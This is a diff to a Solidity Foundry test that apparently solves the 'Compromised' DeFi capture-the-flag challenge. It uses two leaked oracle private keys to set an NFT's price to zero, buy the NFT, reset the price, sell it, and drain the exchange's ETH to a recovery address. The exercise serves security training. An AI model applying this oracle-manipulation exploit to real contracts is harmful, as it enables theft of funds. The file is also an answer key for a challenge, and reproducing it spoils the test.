@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +74,33 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        // 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+        vm.startBroadcast(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        oracle.postPrice(nft.symbol(), 0);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        oracle.postPrice(nft.symbol(), 0);
+        vm.stopBroadcast();
+
+        vm.prank(player);
+        uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+        vm.startBroadcast(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
+        oracle.postPrice(nft.symbol(), INITIAL_NFT_PRICE);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
+        oracle.postPrice(nft.symbol(), INITIAL_NFT_PRICE);
+        vm.stopBroadcast();
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
     }
 
     /**
